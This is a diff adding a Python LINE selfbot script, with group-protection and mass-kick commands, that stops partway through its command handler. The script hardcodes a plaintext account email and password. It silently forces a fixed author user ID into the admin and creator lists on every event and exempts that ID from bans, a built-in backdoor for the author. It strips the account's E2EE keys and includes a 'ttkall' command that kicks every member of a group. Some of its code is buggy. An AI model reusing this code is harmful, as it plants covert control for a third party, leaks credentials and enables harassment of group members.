@@ -1,0 +1,1955 @@
+#selfbot
+from CHRLINE import *
+import json,time,threading,concurrent
+import os,sys,codecs,asyncio
+import contextlib,timeit
+from io import StringIO
+
+
+reb = json.load(codecs.open("reb.json","r","utf-8"))
+settings = json.load(codecs.open("settings.json","r","utf-8"))
+admin = json.load(codecs.open("admin.json","r","utf-8"))
+ban = json.load(codecs.open("ban.json","r","utf-8"))
+jk = json.load(codecs.open("jk.json","r","utf-8"))
+ybk = json.load(codecs.open("asynckill.json","r","utf-8"))
+ttkl = json.load(codecs.open("ttkl.json","r","utf-8"))
+account = json.load(codecs.open("account.json","r","utf-8"))
+creator = json.load(codecs.open("creator.json","r","utf-8"))
+protect = json.load(codecs.open("protect.json","r","utf-8"))
+backdoor = json.load(codecs.open("backdoor.json","r","utf-8"))
+mulai = time.time()
+bigdick = "u6155d5dac1395eab52faa16e832e5c65"
+
+
+@contextlib.contextmanager
+def stdoutIO(stdout=None):
+    old = sys.stdout
+    if stdout is None:
+        stdout = StringIO()
+    sys.stdout = stdout
+    yield stdout
+    sys.stdout = old
+
+def Runtime(secs):
+    mins, secs = divmod(secs,60)
+    hours, mins = divmod(mins,60)
+    days, hours = divmod(hours, 24)
+    return '※%02d Days\n※%02d Hours\n※%02d Minutes\n※%02d Seconds\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ' % (days, hours, mins, secs)
+
+def restart():
+    backupData()
+    python = sys.executable
+    os.execl(python, python, *sys.argv)
+def backupData():
+    try:
+        json.dump(reb,codecs.open('reb.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(settings,codecs.open('settings.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(admin,codecs.open('admin.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(ban,codecs.open('ban.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(jk,codecs.open('jk.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(ybk,codecs.open('asynckill.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(ttkl,codecs.open('ttkl.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(creator,codecs.open('creator.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(protect,codecs.open('protect.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+        json.dump(backdoor,codecs.open('backdoor.json','w','utf-8'), sort_keys=True, indent=4, ensure_ascii=False)
+    except Exception as e:
+        print(f'json backup error --> {e}')
+
+def help():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help.txt', 'r') as f:
+        text = f.read()
+    help = text.format(key=key.title())
+    return help
+def help1():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help1.txt', 'r') as f:
+        text = f.read()
+    help1 = text.format(key=key.title())
+    return help1
+def help2():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help2.txt', 'r') as f:
+        text = f.read()
+    help2 = text.format(key=key.title())
+    return help2
+def help3():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help3.txt', 'r') as f:
+        text = f.read()
+    help3 = text.format(key=key.title())
+    return help3
+def help4():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help4.txt', 'r') as f:
+        text = f.read()
+    help4 = text.format(key=key.title())
+    return help4
+def help5():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help5.txt', 'r') as f:
+        text = f.read()
+    help5 = text.format(key=key.title())
+    return help5
+def help6():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help6.txt', 'r') as f:
+        text = f.read()
+    help6 = text.format(key=key.title())
+    return help6
+def help7():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help7.txt', 'r') as f:
+        text = f.read()
+    help7 = text.format(key=key.title())
+    return help7
+def help8():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help8.txt', 'r') as f:
+        text = f.read()
+    help8 = text.format(key=key.title())
+    return help8
+def help9():
+    key = '' if not settings['setKey']['status'] else settings['setKey']['key']
+    with open('help9.txt', 'r') as f:
+        text = f.read()
+    help9 = text.format(key=key.title())
+    return help9
+
+try:
+    accountinfo=open('account.json','r').read()
+    email=accountinfo['email']
+    password=accountinfo['password']
+    token=accountinfo['token']
+except:
+    email=''
+    password=''
+    token=''
+    open('account.json','w').write(json.dumps({'email':email,'password':password,'token':token}))
+
+class bot:
+    def kickoutFromGroupCall(self, toMid: str, targetMids: list):
+        METHOD_NAME = "kickoutFromGroupCall"
+        params = [[12, 2, [[11, 1, toMid],[15, 2, [11, targetMids]]]]]
+        sqrd = self.han.generateDummyProtocol(METHOD_NAME, params, 3)
+        return self.han.postPackDataAndGetUnpackRespData(self.LINE_CALL_ENDPOINT, sqrd, 3)
+    
+    def __init__(self):
+        self.han=None
+        self.main()
+    def start(self):
+        if token != '':
+            try:
+                self.han=CHRLINE(token,device="DESKTOPWIN")
+                print('Login By Token')
+            except Exception as e:
+                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':''}))
+                print("Token Login failed\nReason:",e)
+        elif email=="" or password=="":
+            account="ikdzcbgaztzeytgeyo@tmmcv.net" 
+            #account = "ezozgyfrwiwvyftwjc@tmmcv.net" #chh4.0
+            password="Tt950413"
+            try:
+                self.han=CHRLINE(account,password,device="DESKTOPWIN")
+                print('Login By Account and Password')
+                open('account.json','w').write(json.dumps({'email':account,'password':password,'token':self.han.authToken}))
+            except Exception as e:
+                print("Password Login failed\nReason:",e)
+                os._exit(1)
+        
+        else:
+            try:
+                self.han=CHRLINE(email,password,device="DESKTOPWIN")
+                print('Login By Email and Password')
+                open('account.json','w').write(json.dumps({'email':email,'password':password,'token':self.han.authToken}))
+            except Exception as e:
+                open('account.json','w').write(json.dumps({'email':'','password':'','token':''}))
+                print("Login failed\nReason:",e)
+                os._exit(1)
+        try:
+            pks = self.han.getE2EEPublicKeys()
+            for pk in pks:
+                print(f"try remove key id: {pk[2]}")
+                self.han.removeE2EEPublicKey(pk[1], pk[2], pk[4])
+        except Exception as e:
+            print(f"remove key error-->{e}")
+        try:    
+            self.han.sendMessage(backdoor['backdoor'],"[Auto Send]\nBot Login Success\nCreator:𝓱𝓪𝓷\nCreator Link:https://line.me/ti/p/~han174\n\nUser Information:\nHost Name:localhost\nIP:127.0.0.1")
+        except Exception as e:
+            print(f"auto login send error-->{e}")
+        # self.han=CHRLINE(account['token'],device="DESKTOPWIN")
+        # def lll():
+        #     AuthToken.append(CHRLINE(self.han.authToken))
+        # ts2 = time.time()
+        # try:
+        #     for i in range(1, 301):threading.Thread(target=lll).start()
+        #     print("Login Ok\nLogin Time: {} s\nLogin Threadings {}".format(time.time()-ts, len(AuthToken)))
+        # except:pass
+        try:
+            if reb['rebid']!={}:
+                self.han.sendMessage(reb['rebid']['0'],"data loading...",relatedMessageId=reb['rebid']['1'])
+                time.sleep(2)
+                self.han.sendMessage(reb['rebid']['0'],"bot restart success",relatedMessageId=reb['rebid']['1'])
+                reb['rebid'] = {}
+                backupData()
+        except Exception as e:
+            print(f'startrebmsg error-->{e}')
+            #reb['reb'] = ""
+            backupData()
+    def bot(self,op,han):
+        def report(to,man,msg,mids=[]):
+            addtxt=''
+            if mids!=[]:
+                addtxt+="\n※Mentioner:"
+                no = 0
+                try:
+                    for mid in mids:
+                        try:
+                            no+=1
+                            y = han.getContact(mid)
+                            addtxt+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
+                        except:
+                            pass
+                except:
+                    pass
+            # addtxt2=''
+            # if kicked !=[]:
+            #     addtxt2+="\n※kicked:"
+            #     no = 0
+            #     try:
+            #         for mid in kicked:
+            #             try:
+            #                 no+=1
+            #                 y = han.getContact(mid)
+            #                 addtxt2+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
+            #             except:
+            #                 pass
+            #     except:
+            #         pass
+            # addtxt3=''
+            # if invited !=[]:
+            #     addtxt3+="\n※invited:"
+            #     no = 0
+            #     try:
+            #         for mid in invited:
+            #             try:
+            #                 no+=1
+            #                 y = han.getContact(mid)
+            #                 addtxt3+="\n"+str(no)+"." + str(y[22]) + "\n" + str(mid)
+            #             except:
+            #                 pass
+            #     except:
+            #         pass
+            han.sendMessage(backdoor['backdoor'],"ΞΞΞΞΞΞΞ〘後台系統〙ΞΞΞΞΞΞΞ\n※"+msg+"\n※Group:\n"+han.getChats([to])[1][0][6]+"\n"+to+"\n※User:\n"+han.getContact(man)[22]+"\n"+man+ f'{addtxt}\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ')
+        if bigdick not in admin['admin']:
+            admin['admin'].append(bigdick)
+            backupData()
+        if bigdick not in creator['creator']:
+            creator['creator'].append(bigdick)
+            backupData()
+        if bigdick in ban['blacklist']:
+            ban['blacklist'].remove(bigdick)
+            backupData()
+        try:
+            if op[3] == 133:
+                #report(op[10],op[11],"有人被踢出",'',[op[12]])
+                if op[12] in admin['admin'] or op[12] in creator['creator']:
+                    if op[10] in protect['adminprotect']:
+                        if op[12] in bigdick:
+                            a = han.getContact(op[11])
+                            b = a[22]
+                            han.sendMessage(op[10], f"{b}???\n誰准你踢大雞雞\n已加入黑單\n出去反省啦")
+                            try:
+                                threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                                han.inviteIntoChat(op[10],[op[12]])
+                            except:
+                                han.sendMessage(op[10], "Error-->request blocked")
+                            if op[11] not in ban['blacklist']:
+                                ban['blacklist'].append(op[11])
+                                backupData()
+                            else:
+                                pass
+                            try:
+                                admin['admin'].remove(op[11])
+                                backupData()
+                            except:
+                                pass
+                            try:
+                                creator['creator'].remove(op[11])
+                                backupData()
+                            except:
+                                pass
+                        else:
+                            if op[11] not in admin['admin'] and op[11] not in creator['creator'] and op[12] not in bigdick:
+                                try:
+                                    threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                                except:
+                                    han.sendMessage(op[10], "Error-->request blocked")
+                                if op[11] not in ban['blacklist']:
+                                    ban['blacklist'].append(op[11])
+                                    backupData()
+                                else:
+                                    pass
+                                try:
+                                    han.findAndAddContactsByMid(op[12])
+                                except Exception as e:
+                                    han.sendMessage(op[10], "無法加友")
+                                    han.sendMessage(op[10], f"Error-->{e}")
+                                try:
+                                    han.inviteIntoChat(op[10],[op[12]])
+                                except Exception as e:
+                                    han.sendMessage(op[10], "回邀失敗")
+                                    han.sendMessage(op[10], f"Error-->{e}")
+                            else:
+                                try:
+                                    han.findAndAddContactsByMid(op[12])
+                                except Exception as e:
+                                    han.sendMessage(op[10], "無法加友")
+                                    han.sendMessage(op[10], f"Error-->{e}")
+                                try:
+                                    han.inviteIntoChat(op[10],[op[12]])
+                                except Exception as e:
+                                    han.sendMessage(op[10], "回邀失敗")
+                                    han.sendMessage(op[10], f"Error-->{e}")
+                if op[10] in protect['kickprotect']:
+                    if op[11] not in admin['admin'] and op[11] not in creator['creator']:
+                        try:
+                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                        except:
+                            han.sendMessage(op[10], "Error-->request blocked")
+                        if op[11] not in ban['blacklist']:
+                            ban['blacklist'].append(op[11])
+                            backupData()
+                        else:
+                            pass
+                    else:
+                        pass
+            if op[3] == 130:
+                if op[11] in ban['blacklist']:
+                    han.sendMessage(op[10], "[警告]\n此人位於黑名單!")
+                    try:
+                        threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                    except:
+                        han.sendMessage(op[10], "Error-->request blocked")
+                if op[10] in jk["joinkick"]:
+                    if op[12] not in admin['admin'] and op[12] not in creator['creator']:
+                        try:
+                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                        except:
+                            han.sendMessage(op[10], "Error-->request blocked")
+                    else:
+                        pass
+            if op[3] == 124:
+                #report(op[10],op[11],"有人被邀請",,[op[12]])
+                if han.profile[1] in op[12]:
+                    if settings['autoJoin'] == True and op[11] in admin['admin'] or op[11] in creator['creator']:
+                        try:
+                            han.acceptChatInvitation(op[10])
+                            han.sendMessage(op[10],"[Auto Send]\nBot Auto Accept Group Invite\nCreator:𝓱𝓪𝓷\nCreator Link:https://line.me/ti/p/~han174")
+                        except Exception as e:
+                            print(f'accept group invite error-->{e}')
+                        try:
+                            protect["adminprotect"].append(op[10])
+                        except:
+                            pass
+                    report(op[10],op[11],"通知邀請入群")
+                if op[10] in protect['inviteprotect']:
+                    if op[11] not in admin['admin'] and op[11] not in creator['creator']:
+                        try:
+                            threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                            threading.Thread(target=han.cancelChatInvitation, args=(op[10],[x])).start()
+                        except:
+                            han.sendMessage(op[10], "Error-->request blocked")
+                        if op[11] not in ban['blacklist']:
+                            ban['blacklist'].append(op[11])
+                            backupData()
+                        else:
+                            pass
+                        try:
+                            jk["joinkick"].append(op[10])
+                            han.sendMessage(op[10], "邀請保護觸發\n自動開啟進群保護")
+                        except:
+                            pass
+                    else:
+                        pass
+                if op[12] in ban['blacklist']:
+                    if op[11] in admin['admin'] or op[11] in creator['creator']:
+                        ban['blacklist'].remove(op[12])
+                        backupData()
+                        han.sendMessage(op[10], "邀請者位於黑名單\n已自動解除")
+                    else:
+                        threading.Thread(target=han.deleteOtherFromChat, args=(op[10],op[11])).start()
+                        ban['blacklist'].append(op[11])
+                        han.cancelChatInvitation(op[10],[op[12]])
+                        han.sendMessage(op[10], "邀請者位於黑名單\n已自動取消邀請\n並將邀請者踢出且加入黑名單")
+            if op[3] in [25,26]:
+                msg=op[20]
+                to=msg[2]
+                if op[3]==26:
+                    if msg[1]not in han.custom_data.get('admin' ,admin['admin']) and msg[1]not in han.custom_data.get('creator' ,creator['creator']):
+                        return
+                if msg[15]==0:
+                    text=msg[10].lower()
+                    match text:
+                        case 'getdata':
+                            msgid = msg.get(21)
+                            if msgid != None:
+                                msgids = han.getPreviousMessageIds(msg[2], 32767)
+                                target_msg = None
+                                for i in msgids[1]:
+                                    if msgid == str(i[2]):
+                                        target_msg = i
+                                        break
+                                if target_msg is not None:
+                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
+                                    han.sendMessage(msg[2], target_msg, relatedMessageId=msgid)
+                                else:
+                                    han.sendMessage(msg[2], "Error")
+                        case '滾出去':
+                            msgid = msg.get(21)
+                            if msgid != None:
+                                msgids = han.getPreviousMessageIds(msg[2], 32767)
+                                target_msg = None
+                                for i in msgids[1]:
+                                    if msgid == str(i[2]):
+                                        target_msg = i
+                                        break
+                                if target_msg is not None:
+                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
+                                    kmid = target_msg[1]
+                                    if kmid not in bigdick and kmid not in han.profile[1]:
+                                        if kmid in msg[1]:
+                                            han.replyMessage(msg, "怎麼有白癡踢自己")
+                                            try:
+                                                threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],kmid)).start()
+                                            except:
+                                                han.replyMessage(msg, "Error-->request blocked")
+                                        else:
+                                            try:
+                                                threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],kmid)).start()
+                                            except:
+                                                han.replyMessage(msg, "Error-->request blocked")
+                                    else:
+                                        if kmid in bigdick:
+                                            if msg[1] in bigdick:
+                                                han.replyMessage(msg, "主人你30公分也不至於踢自己吧")
+                                            else:
+                                                han.replyMessage(msg, "別想踢大懶覺")
+                                        if kmid in han.profile[1]:
+                                            han.replyMessage(msg, "就問怎麼讓我己踢自己???")
+                                else:
+                                    han.sendMessage(msg[2], "Error")
+                            else:
+                                han.replyMessage(msg[2], "Error-->None")
+                        case '爬回來':
+                            msgid = msg.get(21)
+                            if msgid != None:
+                                msgids = han.getPreviousMessageIds(msg[2], 32767)
+                                target_msg = None
+                                for i in msgids[1]:
+                                    if msgid == str(i[2]):
+                                        target_msg = i
+                                        break
+                                if target_msg is not None:
+                                    target_msg = han.getPreviousMessagesV2(msg[2], target_msg[1], target_msg[2])[0]
+                                    kmid = target_msg[1]
+                                    try:
+                                        han.findandAddContactsByMid(kmid)
+                                    except:
+                                        han.replyMessage(msg, "加友規制")
+                                    try:
+                                        han.inviteIntoChat(msg[2],[kmid])
+                                    except:
+                                        han.replyMessage(msg, "邀請失敗")
+                                else:
+                                    han.sendMessage(msg[2], "Error")
+                            else:
+                                han.replyMessage(msg[2], "Error-->None")
+                        case '上面滾出去':
+                            num = 2
+                            try:
+                                data = han.getRecentMessagesV2(msg[2])[num-1]
+                                if data[1] not in bigdick and data[1] not in han.profile[1]:
+                                    if data[1] in msg[1]:
+                                        han.replyMessage(msg, "怎麼有白癡踢自己")
+                                        try:
+                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],data[1])).start()
+                                        except:
+                                            han.replyMessage(msg, "Error-->request blocked")
+                                    else:
+                                        try:
+                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],data[1])).start()
+                                        except:
+                                            han.replyMessage(msg, "Error-->request blocked")
+                                else:
+                                    if data[1] in bigdick:
+                                        if msg[1] in bigdick:
+                                            han.replyMessage(msg, "主人你30公分也不至於踢自己吧")
+                                        else:
+                                            han.replyMessage(msg, "別想踢大懶覺")
+                                    if data[1] in han.profile[1]:
+                                        han.replyMessage(msg, "就問怎麼讓我己踢自己???")
+                            except Exception as e:
+                                han.sendMessage(msg[2], f'{e}', relatedMessageId=msg[4])
+                        case 'ttkall':  
+                            han.replyMessage(msg, "goodbye")
+                            klist = han.getChats([msg[2]])[1][0][8][1][4]
+                            try:
+                                for kmid in klist:
+                                    if kmid not in creator['creator'] and kmid not in han.profile[1] and kmid not in admin['admin']:
+                                            han.deleteOtherFromChat(msg[2], kmid)
+                            except:
+                                han.replyMessage(msg, "Error-->request blocked")
+                            jk["joinkick"].append(msg[2])
+                            report(msg[2],msg[1],"觸發炸群指令")
+                        case 'lb:backdoor':
+                            g = backdoor['backdoor']
+                            try:
+                                try:
+                                    f = han.getChats([g])
+                                    han.replyMessage(msg,"目前模式為:群組後台")
+                                    han.replyMessage(msg,"後台名稱為:\n{}\nID為:\n{}".format(str(f[1][0][6]),g))
+                                except:
+                                    try:
+                                        han.getContact(g)
+                                        han.replyMessage(msg,"目前模式為:私聊後台")
+                                        han.replyMessage(msg,"目前後台為:")
+                                        han.sendContact(to, g)
+                                    except Exception as e:
+                                        han.replyMessage(msg,e)
+                            except Exception as e:
+                                han.relatedMessage(to,e,op.message.id)
+                        case 'lb:help':
+                            han.replyMessage(msg,help())
+                        case 'lb:help1':
+                            han.replyMessage(msg,help1())
+                        case 'lb:help2':
+                            han.replyMessage(msg,help2())
+                        case 'lb:help3':
+                            han.replyMessage(msg,help3())
+                        case 'lb:help4':
+                            han.replyMessage(msg,help4())
+                        case 'lb:help5':
+                            han.replyMessage(msg,help5())
+                        case 'lb:help6':
+                            han.replyMessage(msg,help6())
+                        case 'lb:help7':
+                            han.replyMessage(msg,help7())
+                        case 'lb:help8':
+                            han.replyMessage(msg,help8())
+                        case 'lb:help9':
+                            han.replyMessage(msg,help9())
+                        case 'test':
+                            han.sendMessage(to,"BOTtest")
+                            report(msg[2],msg[1],"test指令觸發")
+                        case 'lb:gmlt':
+                            group = han.getChats([to])
+                            han.replyMessage(msg,"成員加載中...\n請稍後(｡･ω･｡)")
+                            gmb = group[1][0][8][1][4]
+                            if len(gmb) > 500:
+                                han.replyMessage(msg,"該群突破500人無法查詢")
+                                pass
+                            else:
+                                d = ""
+                                d += "ΞΞΞΞΞΞΞ〘群組成員〙ΞΞΞΞΞΞΞ\n"
+                                d += "※群組名稱:{}\n".format(str(group[1][0][6]))
+                                b = 0
+                                for i in gmb:
+                                    try:
+                                        if len(str(d)) >= 8500:
+                                            d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                            han.replyMessage(msg,d)
+                                            d = ""
+                                            d += "ΞΞΞΞΞΞΞ〘群組成員〙ΞΞΞΞΞΞΞ\n"
+                                            d += "※群組名稱:{}※\n".format(str(group[1][0][6]))
+                                        else:
+                                            b = b + 1
+                                            mn = han.getContact(i)[22]
+                                            mi = str(i)
+                                            mm = gmb[i]
+                                            nn = int(round(mm/1000))
+                                            kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
+                                            d += ("※{}."+mn+"\n"+mi+"\n加入時間:" + kk + "\n").format(b)
+                                    except Exception as e:
+                                        print(f'gmlt error-->{e}')
+                                d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                time.sleep(1);han.replyMessage(msg,d)
+                        case 'lb:inlt':
+                            group = han.getChats([to])
+                            han.replyMessage(msg,"邀請列表加載中...\n請稍後(｡･ω･｡)")
+                            gmb = group[1][0][8][1][5]
+                            if len(gmb) > 500:
+                                han.replyMessage(msg,"該群突破500人無法查詢")
+                                pass
+                            else:
+                                d = ""
+                                d += "ΞΞΞΞΞΞΞ〘邀請列表〙ΞΞΞΞΞΞΞ\n"
+                                d += "※群組名稱:{}\n".format(str(group[1][0][6]))
+                                b = 0
+                                for i in gmb:
+                                    try:
+                                        if len(str(d)) >= 8500:
+                                            d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                            han.replyMessage(msg,d)
+                                            d = ""
+                                            d += "ΞΞΞΞΞΞΞ〘邀請列表〙ΞΞΞΞΞΞΞ\n"
+                                            d += "※群組名稱:{}※\n".format(str(group[1][0][6]))
+                                        else:
+                                            if gmb is None:
+                                                d+= "※無邀請列表"   
+                                            else:
+                                                b = b + 1
+                                                mn = han.getContact(i)[22]
+                                                mi = str(i)
+                                                mm = gmb[i]
+                                                nn = int(round(mm/1000))
+                                                kk = (str(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(nn))))
+                                                d += ("※{}."+mn+"\n"+mi+"\n邀請時間:" + kk + "\n").format(b)
+                                    except Exception as e:
+                                        print(f'gmlt error-->{e}')
+                                d += "ΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                                time.sleep(1);han.replyMessage(msg,d)
+                        case 'lb:ap allon':
+                            group = han.groups
+                            for i in group:
+                                try:
+                                    protect["adminprotect"].append(i)
+                                    backupData()
+                                except:
+                                    pass
+                            han.replyMessage(msg,"已開啟全群權限者保護")
+                        case 'lb:apclear':
+                            protect["adminprotect"] = []
+                            backupData()
+                            han.replyMessage(msg,"adminprotect clear success")
+                        case 'lb:jkclear':
+                            jk["joinkick"] = []
+                            backupData()
+                            han.replyMessage(msg,"joinkick clear success")
+                        case 'lb:lg':
+                            groups = han.groups
+                            ret_ = "ΞΞΞΞΞΞΞ〘群組列表〙ΞΞΞΞΞΞΞ"
+                            no = 1
+                            for gid in groups:
+                                group = han.getChats([gid])
+                                ret_ += "\n※{}. {}\n{}".format(str(no), str(group[1][0][6]), str(gid))
+                                no += 1
+                            no+=1
+                            ret_ += "\n[總共 {} 個群組]".format(str(len(groups)))
+                            ret_ += "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                            han.replyMessage(msg, str(ret_))     
+                        
+                        case 'lb:restart':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"bot restarting...")
+                                try:
+                                    reb['rebid']={0:to,1:msg[4]}
+                                    backupData()
+                                except Exception as e:
+                                    print(f'rebmsg error-->{e}')
+                                restart()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試重啟機器")
+                        case 'sp':
+                            a = time.time()
+                            han.replyMessage(msg, '【Test Speed】')
+                            b = time.time()
+                            han.replyMessage(msg, '【%s】' % float((b-a)*0.3))
+                        # case 'spt':
+                        #     with concurrent.futures.ThreadPoolExecutor(max_workers=32) as executor:
+                        #         speed = timeit.timeit('"-".join(str(n) for n in range(100))', number=10000)
+                        #         executor.submit(han.sendMessage(msg[2], "【Test Thread Speed】", relatedMessageId=msg[4]))
+                        #         executor.submit(han.sendMessage(msg[2], f"【{speed}】", relatedMessageId=msg[4]))
+                        case 'spt':
+                            t1 = time.time()
+                            threading.Thread(target=han.replyMessage, args=(msg, "【Test Speed by Thread】")).start()
+                            t2 = time.time()
+                            threading.Thread(target=han.replyMessage, args=(msg, f"【{(t2-t1)*0.2}】")).start()
+                        case 'spa':
+                            async def smd():
+                                han.replyMessage(msg, "【Test Speed by Async】")
+                            start = time.time()
+                            asyncio.run(smd())
+                            elapsed_time = time.time() - start
+                            time.sleep(0.5)
+                            han.replyMessage(msg,"【" + format(str(elapsed_time)) + "】")
+                        case 'lb:ginfo':
+                            group = han.getChats([to])
+                            gtime = group[1][0][3]
+                            gtimee = int(round(gtime/1000))
+                            try:
+                                y = group[1][0][8][1][1]
+                                z = han.getContact(y)
+                                gCreator = z[22]
+                            except:
+                                gCreator = "創群者已砍帳"
+                            if group[1][0][8][1][5] is None:
+                                gPending = "0"
+                            else:
+                                gPending = str(len(group[1][0][8][1][5]))				
+                            ret_ ="ΞΞΞΞΞΞΞ〘群組資訊〙ΞΞΞΞΞΞΞ"
+                            ret_ +="\n※群組名稱:\n{}".format(str(group[1][0][6]))                    
+                            ret_ +="\n※成員數量:\n"+(str(len(group[1][0][8][1][4])))
+                            ret_ +="\n※邀請數量:\n"+(gPending)
+                            ret_ +="\n※創群者:\n"+(str(gCreator))
+                            ret_ +="\n※群組建立時間:\n{}".format(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(gtimee)))
+                            ret_ +="\n※Gid:\n{}".format(to)
+                            ret_ +="\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ"
+                            han.replyMessage(msg, str(ret_))
+                        case 'lb:backupdata':
+                            backupData()
+                            han.replyMessage(msg,"backup data success")
+                        case 'lb:aj on':
+                            if settings["autoJoin"] == False:
+                                settings["autoJoin"] = True
+                                han.replyMessage(msg,"※Auto Join➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:aj off':
+                            if settings["autoJoin"] == True:
+                                settings["autoJoin"] = False
+                                han.replyMessage(msg,"※Auto Join➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:ap on':
+                            if to not in protect["adminprotect"]:
+                                protect["adminprotect"].append(to)
+                                han.replyMessage(msg,"※Admin Protect➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:ap off':
+                            if to in protect["adminprotect"]:
+                                protect["adminprotect"].remove(to)
+                                han.replyMessage(msg,"※Admin Protect➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:kp on':
+                            if to not in protect["kickprotect"]:
+                                protect["kickprotect"].append(to)
+                                han.replyMessage(msg,"※Kick Protect➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:kp off':
+                            if to in protect["kickprotect"]:
+                                protect["kickprotect"].remove(to)
+                                han.replyMessage(msg,"※Kick Protect➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:ip on':
+                            if to not in protect["inviteprotect"]:
+                                protect["inviteprotect"].append(to)
+                                han.replyMessage(msg,"※Invite Protect➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:ip off':
+                            if to in protect["inviteprotect"]:
+                                protect["inviteprotect"].remove(to)
+                                han.replyMessage(msg,"※Invite Protect➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:jk on':
+                            if to not in jk["joinkick"]:
+                                jk["joinkick"].append(to)
+                                han.replyMessage(msg,"※Join Kick➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:jk off':
+                            if to in jk["joinkick"]:
+                                jk["joinkick"].remove(to)
+                                han.replyMessage(msg,"※Join Kick➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:asy on':
+                            if settings["asynckill"] == False:
+                                settings["asynckill"] = True
+                                han.replyMessage(msg,"※Async Kill➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:asy off':
+                            if settings["asynckill"] == True:
+                                settings["asynckill"] = False
+                                han.replyMessage(msg,"※Async Kill➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:ttkl on':
+                            if settings["ttkl"] == False:
+                                settings["ttkl"] = True
+                                han.replyMessage(msg,"※Ttkl Kill➤🟢")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                        case 'lb:ttkl off':
+                            if settings["ttkl"] == True:
+                                settings["ttkl"] = False
+                                han.replyMessage(msg,"※Ttkl Kill➤🔴")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                        case 'lb:url on':
+                            a = han.getChats([to])
+                            if a[1][0][8][1][2] == True:
+                                han.updateChatPreventedUrl(msg[2], False)
+                                han.replyMessage(msg,"※Url➤🟢")
+                            else:
+                                han.replyMessage(msg,"已經是開啟狀態")
+                            report(msg[2],msg[1],"偵測開啟群組網址")
+                        case 'lb:url off':
